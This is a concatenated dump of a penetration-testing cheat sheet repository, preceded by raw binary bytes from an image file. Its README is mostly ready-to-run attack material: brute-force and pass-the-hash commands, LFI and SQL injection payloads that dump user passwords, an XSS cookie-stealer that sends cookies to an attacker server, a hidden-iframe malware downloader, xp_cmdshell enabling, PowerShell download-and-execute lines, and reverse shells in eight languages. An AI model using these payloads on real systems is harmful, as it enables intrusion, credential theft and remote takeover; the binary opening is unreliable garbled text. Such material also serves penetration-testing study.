gr���vw(�Vgk�{��l���ϿƲ2ca�fV.�~>r��<)�`��fGs0bP�u%�
,� 8<�������
��VJ���>;���*�I@挨y�jA�,�eVJ?�s�����h,\@=��Ϝx̭��ۘv��L�����_1>��_m���C��t�C�La�N����)�L�2n�����~w�L2�a>�H����0�g(��-]W�~�4Ж_�64�O���Q�"�w][�����9C%��:&""j&Q�DDD10`���IDDg�R�X~b{��J�'h��
2!�
��'��T��GY���IjKr��.�g�:~Q�����v5�Hda��c���Qز��\��Mdh|j�;��5��߽1y�hg�-$,�A)���4O/JPM�)�[>�����VX]������o)�|��O,9��@�V�~����gN>�VV�����/~��x�/����@Z����a���7Y�@��[��[؎�+?��0�`�4{�|׫�x�qMˀ���)��K�&��aR_і�������$$`
X�`����b�E	��XwJ�Y�~͉�:LA��nQ;0`QG	�=�6�&u��ܑ���b`�$�n蓩�4�0���8��&Q�Ɇ��<ä>��I�n�X�ѽ�0`R�c�$j;F̍.>q&�<L�v7��Ѐڹ�ĀI=���:��EL�y�D�q[�K���X|���Z<��{�T`q����;7�������Y}�~��_��_�=�D��ypN=�������bl��ݸ� ���.1nȊ�J�r��8���;@�%(S�@든`���ڟ���U���Lm��彔Bim��VnV�����q(<#Eɓ
�몙�v�7�X?&m�8�.��^579�K�k�`^�<{�_�N0]�������U����?��M�S�Z~�Mq���ҳ~���[���K�����n�.�^2
�.<��_�}w[N��aR?�����V����|ga��d��`��Z���p��چd'�'mDY0�{`
;���pJ
s����ahUUՈ��*]l1Qb0i�T
Wk*$`j-կ1CL6�,׭�֍�W�ۼ��gS��~]�&�?�"�J�)2A���I�T�2`QS0i�r!�c���1`�@+-����IŞȷ�s=A?�V4!qamMk{�҇�di��ʵ!�*��&�	�j����>E�?f10��Z�"j��������4���E鬟@y���h�prf���?�ɓ��:�`�8����ě^�j8N�q��`���)4DtL(M�(�{2��#$3Ɏo�Ϊ����X9�h��8,����D|u�`I&
������V%�J��`�J��%�{n�8�m
�������BDMb�����R�D�r�4hx�IDMa�$""���~h�(�yqj2�R:pu�րLo��ͫ�sY�����k
+r �n�4pn��V
��+<_u�U�>q\a�<��Nz�m���J��Rq�/�ҿ���J���������b��S^���ɥ��ה	�X)������(a�4pn9Y����}��_>c�u���w��_
:�t/���{���x�������?����u/O'����'�����$�H�a�$����!�/2]�M�L��H/PV_�,���HR�"JN�!��1��tR䱤@��Dd���QP��nQZ0`m��{���62bxI����h��m�O�H�tK��N�!ڠ��ELp̬f�(X;ty/m[p\�J%��J܊�3�U����V˪�f�ϳdK�]l2Q���t?�68p�������-�Lh��(�P�P�Z)�c\���Ol��°"{%Wpϱ
*N������5�Nءu�q�ޗ?�2{dA�֚�}P눈{4���o;���v�&�橷��5Ai'ޙ��ֳ�K��2Ƨ�&Z��;ӽ�ދ?�X�U���V���s^���~����&�H��K�D�'���%ͺ
�@[
�5p7рiA�'�^[�0�Ͻ�����%�@��I?D�m^q�X0������@�+0��R��C&��'�nQ�`�$`
���@�+8K��	��se�"V�e��Β�m�˧��k�[��I�qD=���	���,U
������;o����'�������≛�v���Zs���Yh���{<S\9��D�pQ�}�-o��+_����s��abԷ�����
Ѧ1`�����G��fr]L�������5���p�Q�ygt3I7���@�O0�:㾤�j��U$�6a�$�J�
�믹�}��Mؙ�:�(�d�m��{_}�u"j
&QGȱ�[�^�2I���_0��Ts�$�
��.kL�6a�$ꀥ�S�n_���6b
8k��%��6�������$""�����(L""�0���b`�$""�����(L""�0���b`�$""�����(L""�0���b`�$""�����(L""�0���b`�$""�����(L""�0���b`�$""�����(L""�0���b`�$""�����(L""�0���b`�$""�����(L""�0���b`�$""�����(L""�0���b`�$""�����(L""�0���b`�$""�����(L""�0���b`�$""�����(L""�0���b`�$""������eB��<�JIEND�B`�


---
File: /CheatSheets/grep.md
---

#Taking Users to bruteforce

##smb

Using enum4linux
 
`./enum4linux.pl -U 192.168.1.113 | grep 'user:' | cut -d'[' -f2 | cut -d']' -f1 > Users`

Using nmap *smb-enum-users.nse*

`nmap 192.168.1.113 --script smb-enum-users.nse | grep "Full name:"`



---
File: /contribution.md
---

# Contribution

## Tricks

1. Create a [GitHub](https://github.com) account.
2. Fork [Pentest-Cheat-Sheets](https://github.com/kitsun3sec/Pentest-Cheat-Sheets).
3. Clone GitHub forked Pentest-Cheat-Sheets repository:
    `git clone https://github.com/[YourGithubAccount]/Pentest-Cheat-Sheets`
4. Create a new branch:
  `git branch -m branchname`
5. Add your code. 
6.  Add your code to stage are
   `git add --all`
7. Commit 
  ` git commit -m "description of your trick"`
8. Push  
    `git push -u origin branchname`

## Adding new Trick

1. You need to create a folder into **CheatSheets** .
    Example: `mkdir nmap`
2. Create a **readme.md** into this folder.
	`CheatSheets/* has many examples`
3. Add your NINJA tricks.

## Modifying one

1. Open the file using your favorite text editor
    `vim CheatSheets/ssh/readme.md`
2. Make your changes and send to us


#### We really <3 You!



---
File: /README.md
---

<p align="center">
  <img src="https://github.com/Kitsun3Sec/Pentest-Cheat-Sheets/blob/master/CheatSheets/28533648.png" alt="Pentest Cheat Sheets" width="300" />
</p>

<p align="center">
  Pentest-Cheat-Sheets<br>
  @n3k00n3 | @UserXGnu | @alacerda
</p>

This repo has a collection of snippets of codes and commands to help our lives!
The main purpose is not be a crutch, this is a way to do not waste our precious time!
This repo also helps who trying to get OSCP. You'll find many ways to do something without Metasploit Framework.

## Ninja Tricks

- [Recon](#recon)
  - [DNS](#dns)
  - [SPF](#spf-recon)
  - [Nmap](#nmap)
  - [NetCat](#netcat)
  - [SNMP](#SNMP)
  - [Mysql](#mysql)
  - [MS SQL](#ms-sql)
  - [Web Enumeration](#web-enumeration)
- [Exploitation](#exploitation)
  - [System Network](#system-network)
    - [RDP](#rdp)
    - [Pass The Hash](#pass-the-hash)
    - [Windows-Shell](#windows-shell)
  - [Web Application](#web-application)
    - [Web Remote Code Execution](#web-remote-code-execution)
    - [LFI](#lfi)
    - [encode](#encode)
    - [XSS](#xss)
    - [SQLi](#sqli)
      - [sqlmap](#sqlmap)
      - [Bare Hands](#bare-hands)
    - [Jekins](#jekins)
- [Post-exploitation](#post-exploitation)
  - [Reverse Shell](#reverse-shell)
    - [PHP Reverse Shell](#php-reverse-shell)
    - [Perl Reverse Shell](#perl-reverse-shell)
    - [python Reverse Shell](#python-reverse-shell)
    - [Ruby Reverse Shell](#ruby-reverse-shell)
    - [bash Reverse Shell](#bash-reverse-shell)
    - [powershell Reverse Sheel](#powershell-reverse=shell)
    - [Java Reverse Sheel](#java-reverse=shell)
    - [Xterm Reverse Sheel](#xterm-reverse=shell)
  - [Linux](#linux)
    - [Linux Privilege Escalation](#linux-privilege-escalation)
    - [Data Haversting and Enumeration](#data-harvesting-enumeration)
    - [Linux Pivot](#linux-pivot)
      - [Sshutle](#sshutle)
      - [VPNPivot](#vpn-pivot)
      - [SSH Tunneling](#ssh-tunneling)
      - [Linux Backdoring](#linux-backdoring)
  - [Windows](#Windows)
    - [Windows Enumeration](#windows-enumeration)
    - [Windows Privilege Escalation](#windows-privilege-escalation)
    - [Hashdump](#hashdump)
    - [Transferring Files Without Metasploit](#transferring-files-without-metasploit)
    - [Backdoring](#windows-backdoring)
    - [Windows Pivot](#windows-pivot)
      - [Openssh for Tunneling](#openssh-for-tunneling)
      - [Plink](#plink)
- [Resources](#resources)
  - [HTTP/HTTPS Servers](#http-server)
  - [Wordlist](#wordlist)
    - [seclist](#seclist)
    - [cotse](#cotse)
    - [PacketStorm](#packetstorm)
  - [Default Passwords](#default-passwords)
    - [Default Passoword](#default-password)
    - [Router Password](#Router-password)
  - [Leak](#leak)
    - [Pastebin](#pastebin)
  - [Tables](#tables)
- [Contribution](#contribution)

# Recon

## DNS

### Nslookup

Resolve a given hostname to the corresponding IP.

```shell
nslookup targetorganization.com
```

### Reverse DNS lookup

```shell
nslookup -type=PTR IP_address
```

### MX(Mail Exchange) lookup

```shell
nslookup -type=MX domain
```

### Zone Transfer

#### Using nslookup Command

```shell
nslookup
server domain.com
ls -d domain.com
```

#### Using HOST Command

host -t ns(Name Server) < domain >

```shell
host -t ns domain.com
```

after that test nameservers

host -l < domain > < nameserver >

```shell
host -l domain.com ns2.domain.com
```

### Nmap Dns Enumaration

```
nmap -F --dns-server <dns server ip> <target ip range>
```

### Auto tools

#### DNSenum

```
dnsenum targetdomain.com
```

```
dnsenum --target_domain_subs.txt -v -f dns.txt -u a -r targetdomain.com
```

#### DNSmap

```bash
targetdomain.com
```

```bash
dnsmap targetdomain.com -w <Wordlst file.txt>
```

Brute Force, the file is saved in /tmp

```bash
dnsmap targetdomain.com -r
```

#### DNSRecon DNS Brute Force

```bash
dnsrecon -d TARGET -D /usr/share/wordlists/dnsmap.txt -t std --xml ouput.xml
```

#### Fierce.pl

```
fierce -dns targetdomain.com
```

#### HostMap

```
hostmap.rb -only-passive -t <IP>
```

We can use -with-zonetransfer or -bruteforce-level

##

## SPF Recon

### Dig SPF txt

```bash
dig txt target.com
```

#### Dmarc

```bash
dig TXT _dmarc.example.org
```

#### Online Tools

- https://dnsdumpster.com/
- https://network-tools.com/nslook/
- https://www.dnsqueries.com/en/
- https://mxtoolbox.com/

##

## Nmap

Set the ip address as a varible

`export ip=192.168.1.100`
`export netw=192.168.1.0/24`

### Detecting Live Hosts

Only Ip's

```shell
nmap -sn -n $netw | grep for | cut -d" " -f5
```

### Stealth Scan

```shell
nmap -sS $ip
```

Only Open Ports and Banner Grab

```shell
nmap -n -Pn -sS $ip --open -sV
```

Stealth scan using FIN Scan

```shell
nmap -sF $ip
```

### Agressive scan

Without Ping scan, no dns resolution, show only open ports all and test All TCP Ports

```shell
nmap -n -Pn -sS -A $ip --open -p-
```

Nmap verbose scan, runs syn stealth, T4 timing, OS and service version info, traceroute and scripts against services

```shell
nmap –v –sS –A –T4 $ip
```

### OS FigerPrint

```shell
nmap -O $ip
```

### Quick Scan

```shell
nmap -T4 -F $netw
```

### Quick Scan Plus

```shell
nmap -sV -T4 -O -F --version-light $netw
```

### output to a file

```shell
nmap -oN nameFile -p 1-65535 -sV -sS -A -T4 $ip
```

### output to a file Plus

```shell
nmap -oA nameFile -p 1-65535 -sV -sS -A -T4 $netw
```

### Search NMAP scripts

```shell
ls /usr/share/nmap/scripts/ | grep ftp
```

- [Nmap Discovery](https://nmap.org/nsedoc/categories/discovery.html)

##

## NetCat

### Port Scanner

One port

```shell
nc -nvz 192.168.1.23 80
```

Port Range

```shell
nc -vnz 192.168.1.23 0-1000
```

### Send files

- Server

```shell
nc -lvp 1234 > file_name_to_save
```

- Client

```shell
nc -vn 192.168.1.33 1234 < file_to_send
```

### Executing remote script

- Server

```shell
nc -lvp 1234 -e ping.sh <IP>
```

- Client

```shell
nc -vn 192.168.1.33 1234
```

### Chat with encryption

- Server

```shell
ncat -nlvp 8000 --ssl
```

- Client

```shell
ncat -nv 192.168.1.33 8000
```

### Banner Grabbing

- Request

```shell
nc target port
HTTP_Verb path http/version
Host: url
```

- Response

```shell
nc www.bla.com.br 80
HEAD / HTTP/1.0
Host: www.bla.com.br
```

### If this site uses https you need to use openssl

```shell
openssl s_client -quiet www.bla.com.br:443
```

##

## SNMP

### Fixing SNMP output

```shell
apt-get install snmp-mibs-downloader download-mibs
```

```shell
echo "" > /etc/snmp/snmp.conf
```

### OneSixtyone

onesixtyone -c COMMUNITY_FILE -i Target_ip

```shell
onesixtyone -c community.txt -i Found_ips.txt
```

### snmpwalk

Walking MIB's

snmpwalk -c COMMUNITY -v VERSION target_ip

```shell
snmpwalk -c public -v1 192.168.25.77
```

specific MIB node
snmpwalk -c community -v version Target IP MIB Node
Example: USER ACCOUNTS = 1.3.6.1.4.1.77.1.2.25

```shell
snmpwalk -c public -v1 192.168.25.77 1.3.6.1.4.1.77.1.2.25
```

### snmp-check

snmp-check -t target_IP | snmp-check -t TARGET -c COMMUNITY

```shell
snmp-check -t 172.20.10.5
```

```shell
snmp-check -t 172.20.10.5 -c public
```

### Automate the username enumeration process for SNMPv3

```shell
apt-get install snmp snmp-mibs-downloader
```

```shell
wget https://raw.githubusercontent.com/raesene/TestingScripts/master/snmpv3enum.rb
```

### NMAP SNMPv3 Enumeration

```shell
nmap -sV -p 161 --script=snmp-info 172.20.10.0/24
```

### Default Credentials

```shell
/usr/share/metasploit-framework/data/wordlists/snmp_default_pass.txt
```

##

## MYSQL

### Try remote default Root access

Mysql Open to wild

```shell
mysql -h Target_ip -u root -p
```

## MSSQL

### MSQL Information Gathering

```
nmap -p 1433 --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER $ip
```

## Web Enumeration

### Dirsearch

```shell
dirsearch -u target.com -e sh,txt,htm,php,cgi,html,pl,bak,old
```

```shell
dirsearch -u target.com -e sh,txt,htm,php,cgi,html,pl,bak,old -w path/to/wordlist
```

```shell
dirsearch -u https://target.com -e .
```

### dirb

```shell
dirb http://target.com /path/to/wordlist
```

```shell
dirb http://target.com /path/to/wordlist -X .sh,.txt,.htm,.php,.cgi,.html,.pl,.bak,.old
```

### Gobuster

```shell
gobuster -u https://target.com -w /usr/share/wordlists/dirb/big.txt
```

##

# Exploitation

## System Network

## RDP

### xfreerdp

##### Simple User Enumeration for Windows Target (kerberos based)

xfreerdp /v:<target_ip> -sec-nla /u:""

```
xfreerdp /v:192.168.0.32 -sec-nla /u:""
```

### login

xfreerdp /u:<user> /g:<domain> /p:<pass> /v:<target_ip>

```
xfreerdp /u:administrator /g:grandbussiness /p:bla /v:192.168.1.34
```

#### Wordlist based bruteforce

### NCRACK

ncrack -vv --user/-U <username/username_wordlist> --pass/-P <password/password_wordlist> <target_ip>:3389

```
ncrack -vv --user user -P wordlist.txt 192.168.0.32:3389
```

### Crowbar

crowbar -b rdp <-u/-U user/user_wordlist> -c/-C <password/password_wordlist> -s <target_ip>/32 -v

```
crowbar -b rdp -u user -C password_wordlist -s 192.168.0.16/32 -v
```

## Pass the hash

### Smb pass the hash

#### Tool:

[pth-toolkit](https://github.com/byt3bl33d3r/pth-toolkit)

### Listing shared folders

sudo pth-smbclient --user=<user> --pw-nt-hash -m smb3 -L <target_ip> \\\\<target_ip>\\ <hash>

```
sudo pth-smbclient --user=user --pw-nt-hash -m smb3  -L 192.168.0.24 \\\\192.168.0.24\\ ljahdçjkhadkahdkjahsdlkjahsdlkhadklad
```

### Interactive smb shell

sudo pth-smbclient --user=<user> --pw-nt-hash -m smb3 \\\\<target_ip>\\shared_folder <hash>

```
sudo pth-smbclient --user=user --pw-nt-hash -m smb3 \\\\192.168.0.24\\folder ljahdçjkhadkahdkjahsdlkjahsdlkhadklad
```

## Web Application

### Web Remote code

### LFI (Local File Inclusion)

Situation

```
http://<target>/index.php?parameter=value
```

#### How to Test

```
http://<target>/index.php?parameter=php://filter/convert.base64-encode/resource=index
```

```
http://<target>/script.php?page=../../../../../../../../etc/passwd

```

```
http://<target>/script.php?page=../../../../../../../../boot.ini
```

#### LFI Payloads

- [Payload All the Things](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion/Intruders)
- [Seclist LFI Intruder](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI)

### encode

## XSS

### Reflected

#### Simple test

This is a simple test to see what happens, this is not a prove that the field is vuln to xss

```javascript
<plaintext>
```

#### Simple XSS test

```javascript
<script>alert('Found')</script>
```

```javascript
"><script>alert(Found)</script>">
```

```javascript
<script>alert(String.fromCharCode(88,83,83))</script>
```

#### Bypass filter of tag script

`"  onload="alert(String.fromCharCode(88,83,83))`

```javascript
" onload="alert('XSS')
```

bla is not a valid image, so this cause an error

```javascript
<img src='bla' onerror=alert("XSS")>
```

### Persistent

```javascript
>document.body.innerHTML="<style>body{visibility:hidden;}</style><div style=visibility:visible;><h1>HACKED!</h1></div>";
```

### PHP collector

`> cookie.txt`
`chmod 777 cookie.txt`

edit a php page like colector.php as follow:

```php
<?php
  $cookie=GET['cookie'];
  $useragent=$_SERVER['HTTP_USER_AGENT'];
  $file=fopen('cookie.txt', 'a');
  fwrite($file,"USER AGENT:$useragent || COOKIE=$cookie\n");
  fclose($file);
?>
```

Script to put in page:

```javascript
<scritp>new Image().src="http://OUR_SERVER_IP/colector.php?cookie="+document.cookie;</script>
```

#### Malware Donwloader via XSS

```javascript
<iframe src="http://OUR_SERVER_IP/OUR_MALWARE" height="0" width="0"></iframe>
```

#### How to play Mario with XSS

```javascript
<iframe
  src="https://jcw87.github.io/c2-smb1/"
  width="100%"
  height="600"
></iframe>
```

```javascript
<input onfocus="document.body.innerHTML=atob('PGlmcmFtZSBzcmM9Imh0dHBzOi8vamN3ODcuZ2l0aHViLmlvL2MyLXNtYjEvIiB3aWR0aD0iMTAwJSIgaGVpZ2h0PSI2MDAiPjwvaWZyYW1lPg==')" autofocus>
```

#### XSS payloads

- [Payload All The Things](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection)
- [Seclist XSS](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/XSS)

## SQLI

Sql Injection

### Sqlmap

#### GET

#### Error-Based

#### Simple test

`Adding a simpe quote '`

Example:

```javascript
http://192.168.1.104/Less-1/?id=5'
```

#### List databases

```bash
./sqlmap.py -u http://localhost/Less-1/?id=1 --dbs
```

#### List tables

```bash
./sqlmap.py -u http://localhost/Less-1/?id=1 -D database_name --tables
```

#### List columns

```bash
./sqlmap.py -u http://localhost/Less-1/?id=1 -D database_name -T table_name --columns
```

#### Dump all

```bash
./sqlmap.py -u http://localhost/Less-1/?id=1 -D database_name -T table_name --dump-all
```

#### Set Cookie

```bash
./sqlmap.py -u http://target/ovidentia/index.php\?tg\=delegat\&idx\=mem\&id\=1 --cookie "Cookie: OV1364928461=6kb5jvu7f6lg93qlo3vl9111f8" --random-agent --risk 3 --level 5 --dbms=mysql -p id --dbs
```

#### Checking Privileges

```bash
./sqlmap.py -u http://localhost/Less-1/?id=1 --privileges | grep FILE
```

#### Reading file

```bash
./sqlmap.py -u <URL> --file-read=<file to read>
```

```bash
./sqlmap.py -u http://localhost/Less-1/?id=1 --file-read=/etc/passwd
```

#### Writing file

```
./sqlmap.py -u <url> --file-write=<file> --file-dest=<path>
```

```
./sqlmap.py -u http://localhost/Less-1/?id=1 --file-write=shell.php --file-dest=/var/www/html/shell-php.php
```

#### POST

```bash
./sqlmap.py -u <POST-URL> --data="<POST-paramters> "
```

```bash
./sqlmap.py -u http://localhost/Less-11/ --data "uname=teste&passwd=&submit=Submit" -p uname
```

You can also use a file like with the post request:

```bash
./sqlmap.py -r post-request.txt -p uname
```

### Bare Hands

#### GET

#### Error-Based

#### Simple test

`Adding a simpe quote '`

Example:

```
http://192.168.1.104/Less-1/?id=5'
```

#### Fuzzing

Sorting columns to find maximum column

`http://192.168.1.104/Less-1/?id=-1 order by 1`

`http://192.168.1.104/Less-1/?id=-1 order by 2`

`http://192.168.1.104/Less-1/?id=-1 order by 3`

(until it stop returning errors)

---

#### Finding what column is injectable

**mysql**

`http://192.168.1.104/Less-1/?id=-1 union select 1, 2, 3`

(using the same amount of columns you got on the previous step)

**postgresql**

`http://192.168.1.104/Less-1/?id=-1 union select NULL, NULL, NULL`

(using the same amount of columns you got on the previous step)

one of the columns will be printed with the respective number

---

#### Finding version

**mysql**

`http://192.168.1.104/Less-1/?id=-1 union select 1, 2, version()`

**postgres**

`http://192.168.1.104/Less-1/?id=-1 union select NULL, NULL, version()`

#### Finding database name

**mysql**

`http://192.168.1.104/Less-1/?id=-1 union select 1,2, database()`

**postgres**

`http://192.168.1.104/Less-1/?id=-1 union select NULL,NULL, database()`

#### Finding usernames logged in

**mysql**

`http://192.168.1.104/Less-1/?id=-1 union select 1, 2, current_user()`

#### Finding databases

**mysql**

`http://192.168.1.104/Less-1/?id=-1 union select 1, 2, schema_name from information_schema.schemata`

**postgres**

`http://192.168.1.104/Less-1/?id=-1 union select 1, 2, datname from pg_database`

#### Finding table names from a database

**mysql**

```
http://192.168.1.104/Less-1/?id=-1 union select 1, 2, table_name from information_schema.tables where table_schema="database_name"
```

**postgres**

```
http://192.168.1.104/Less-1/?id=-1 union select 1, 2, tablename from pg_tables where table_catalog="database_name"
```

#### Finding column names from a table

**mysql**

```
http://192.168.1.104/Less-1/?id=-1 union select 1, 2, column_name from information_schema.columns where table_schema="database_name" and table_name="tablename"
```

**postgres**

```
http://192.168.1.104/Less-1/?id=-1 union select 1, 2, column_name from information_schema.columns where table_catalog="database_name" and table_name="tablename"
```

#### Concatenate

Example:

`http://192.168.1.104/Less-1/?id=-1 union select 1, 2, login from users;`
`http://192.168.1.104/Less-1/?id=-1 union select 1, 2, password from users;`

in one query

`http://192.168.1.104/Less-1/?id=-1 union select 1, 2, concat(login,':',password) from users;` **mysql**
`http://192.168.1.104/Less-1/?id=-1 union select 1, 2, login||':'||password from users;` **postgres**

### Error Based SQLI (USUALLY MS-SQL)

#### Current user

`http://192.168.1.104/Less-1/?id=-1 or 1 in (SELECT TOP 1 CAST(user_name() as varchar(4096)))--`

#### DBMS version

`http://192.168.1.104/Less-1/?id=-1 or 1 in (SELECT TOP 1 CAST(@@version as varchar(4096)))--`

#### Database name

`http://192.168.1.104/Less-1/?id=-1 or db_name(0)=0 --`

#### Tables from a database

`http://192.168.1.104/Less-1/?id=-1 or 1 in (SELECT TOP 1 CAST(name as varchar(4096)) FROM dbname..sysobjects where xtype='U')--`

---

`http://192.168.1.104/Less-1/?id=-1 or 1 in (SELECT TOP 1 CAST(name as varchar(4096)) FROM dbname..sysobjects where xtype='U' AND name NOT IN ('previouslyFoundTable',...))--`

#### Columns within a table

`http://192.168.1.104/Less-1/?id=-1 or 1 in (SELECT TOP 1 CAST(dbname..syscolumns.name as varchar(4096)) FROM dbname..syscolumns, dbname..sysobjects WHERE dbname..syscolumns.id=dbname..sysobjects.id AND dbname..sysobjects.name = 'tablename')--`

> remember to change **dbname** and **tablename** accordingly with the given situation
> after each iteration a new column name will be found, make sure add it to ** previously found column name ** separated by comma as on the next sample

`http://192.168.1.104/Less-1/?id=-1 or 1 in (SELECT TOP 1 CAST(dbname..syscolumns.name as varchar(4096)) FROM dbname..syscolumns, dbname..sysobjects WHERE dbname..syscolumns.id=dbname..sysobjects.id AND dbname..sysobjects.name = 'tablename' AND dbname..syscolumns.name NOT IN('previously found column name', ...))--`

#### Actual data

`http://192.168.1.104/Less-1/?id=-1 or 1 in (SELECT TOP 1 CAST(columnName as varchar(4096)) FROM tablename)--`

> after each iteration a new column name will be found, make sure add it to ** previously found column name ** separated by comma as on the next sample

`http://192.168.1.104/Less-1/?id=-1 or 1 in (SELECT TOP 1 CAST(columnName as varchar(4096)) FROM tablename AND name NOT IN('previously found row data'))--`

#### Shell commands

`EXEC master..xp_cmdshell <command>`

> you need yo be 'sa' user

#### Enabling shell commands

`EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_congigure 'xp_shell', 1; RECONFIGURE;`

### Jenkins

##

# Post Exploitation

## Reverse Shell

### PHP Reverse Shell

```php
php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
```

Tiny Reverse Shell

```php
<?php
exec("/bin/bash -c 'bash -i >& /dev/tcp/10.9.36.167/1337 0>&1'");
```

### Perl Reverse Shell

```perl
perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

```

### Python Reverse Shell

```python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

### Ruby Reverse Shell

```ruby
ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

### Bash Reverse Shell

```bash
bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
```

### Powershell Reverse Shell

Create a simple powershell script called reverse.ps1:

```powershell
function reverse_powershell {
    $client = New-Object System.Net.Sockets.TCPClient("10.10.10.10",80);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
}
```

```powershell
powershell -ExecutionPolicy bypass -command "Import-Module reverse.ps1; reverse_powershell"
```

### Java Reverse Shell

```java
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/2002;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```

### Xterm Reverse Shell

One of the simplest forms of reverse shell is an xterm session. The following command should be run on the server. It will try to connect back to you (10.0.0.1) on TCP port 6001.

```bash
xterm -display 10.0.0.1:1
```

To catch the incoming xterm, start an X-Server (:1 – which listens on TCP port 6001). One way to do this is with Xnest (to be run on your system):

```bash
Xnest :1

```

You’ll need to authorise the target to connect to you (command also run on your host):

```bash
xhost +targetip
```

##

## Linux

## Windows

### Transferring Files Without Metasploit

#### Powershell

Download files with powershell

```powershell
powershell -c "Invoke-WebRequest -uri 'http://Your-IP:Your-Port/winPEAS.bat' -OutFile 'C:\Windows\Temp\winPEAS.bat'"
```

```powershell
powershell iex (New-Object Net.WebClient).DownloadString('http://your-ip:your-port/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress your-ip -Port your-port
```

```powershell
powershell "(New-Object System.Net.WebClient).Downloadfile('http://<ip>:8000/shell-name.exe','shell-name.exe')"
```

Creating a server with python3

```shell
python -m http.server
```

Creating a server with python2

```shell
python -m SimpleHTTPServer 80
```

#### FTP

You need to create a FTP server

- Server Linux
  Allow anonymous

```shell
python -m pyftpdlib -p 21 -u anonymous -P anonymous
```

- Windows Client

```shell
ftp
open target_ip port
open 192.168.1.22 21
```

we can simply run ftp -s:ftp_commands.txt and we can download a file with no user interaction.

like this:

```shell
C:\Users\kitsunesec\Desktop>echo open 10.9.122.8>ftp_commands.txt
C:\Users\kitsunesec\Desktop>echo anonymous>>ftp_commands.txt
C:\Users\kitsunesec\Desktop>echo whatever>>ftp_commands.txt
C:\Users\kitsunesec\Desktop>ftp -s:ftp_commands.txt
```

#### Apache Server

- server
  Put your files into /var/www/html

```shell
cp nc.exe /var/www/html
systemctl start apache2
```

- client

Get via web browser, wget or powershell...

### Windows Pivoting

#### Openssh for Tunneling

Once you got SYSTEM on the target machine. download: [openssh_for_windows](https://github.com/PowerShell/Win32-OpenSSH/releases)

```powershell
powershell -command "Expand-Archive 'C:\<path-to-zipped-openssh>\openssh.zip' c:\<path-to-where-you-whereever-you-want\"
```

Then install it:

```powershell
powershell -ExecutionPolicy Bypass -File c:\<path-to-unzipped-openssh-folder>\install-sshd.ps1
```

Now if you need, just adjust the firewall rules to your needs:

```powershell
powershell -Command "New-NetFirewallRule -Name sshd -DisplayName 'OpenSSH Server (sshd)' -Enabled True -Direction Inbound -Protocol TCP -Action Allow -LocalPort 22"
```

Start the sshd service:

```powershell
net start sshd
```

After these steps a regular ssh tunnel would sufice:

From your linux machine:

```bash
$ ssh -ACv -D <tunnel_port> <windows-user>@<windows-ip>
```

done you have now a socks to tunnel through!!

##

# Resources

##

#### HTTP/HTTPS Servers

HTTPS using Python

Create the Certificate:

```
openssl req -new -x509 -keyout server.pem -out server.pem -days 365 -nodes
```

Start the HTTPS Server

```
import BaseHTTPServer, SimpleHTTPServer
import ssl

httpd = BaseHTTPServer.HTTPServer(('0.0.0.0', 443), SimpleHTTPServer.SimpleHTTPRequestHandler)
httpd.socket = ssl.wrap_socket (httpd.socket, certfile='./server.pem', server_side=True)
httpd.serve_forever()
```

## Wordlists

- Wordlists
  - [PacketStorm](https://packetstormsecurity.com/Crackers/wordlists/dictionaries/)
  - [SecList](https://github.com/danielmiessler/SecLists)
  - [cotse](http://www.cotse.com/tools/wordlists1.htm)
- Default Password
  - [DefaultPassword](http://www.defaultpassword.com/)
  - [RouterPassword](http://www.routerpasswords.com/)
- Leak
  - [Pastebin](https://pastebin.com)
- Tables
  - [RainbowCrack](https://project-rainbowcrack.com/table.htm)

##

## Contribution

[HOW TO](https://github.com/Kitsun3Sec/Pentest-Cheat-Sheets/tree/master/contribution.md)

